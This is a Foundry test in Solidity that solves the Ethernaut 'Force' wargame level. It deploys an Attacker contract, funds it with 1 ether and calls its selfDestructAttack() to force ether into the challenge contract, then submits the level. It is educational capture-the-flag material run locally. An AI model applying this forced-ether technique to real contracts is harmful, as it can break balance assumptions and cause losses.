// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/07-Force/ForceFactory.sol";
import "src/07-Force/Attacker.sol";

contract BaseSetUp is Test {
    Ethernaut ethernaut;
    address payable attacker;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attacker = payable(vm.addr(1));      
        vm.deal(attacker, 10 ether);
        vm.label(attacker, "Attacker");
    }
}

contract Attack is BaseSetUp {
    Force ethernautForce;
    Attacker attackerContract;
    address payable levelAddress;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);

        vm.startPrank(attacker);
        levelAddress = payable(ethernaut.createLevelInstance(forceFactory));
        ethernautForce = Force(levelAddress);
        console.log("Ethernaut Force Challenge!");

        vm.stopPrank();
    }

    function testAttack() public {

        uint initialBalance = address(ethernautForce).balance;
        emit log_named_uint("Force initial balance", initialBalance);

        vm.startPrank(attacker);

        // Fund attackerContract with ether and call selfDestructAttack()
        attackerContract = new Attacker(address(ethernautForce));

        (bool success, ) = address(attackerContract).call{value: 1 ether}("");
        emit log_named_uint("Attacker balance", address(attackerContract).balance);
        attackerContract.selfDestructAttack();

        uint newBalance = address(ethernautForce).balance;
        emit log_named_uint("Force new balance", newBalance);
        assert(newBalance > initialBalance);

        // Submit Level
        bool passedLevel = ethernaut.submitLevelInstance(levelAddress);
        assert(passedLevel);

        
        vm.stopPrank();
    }
}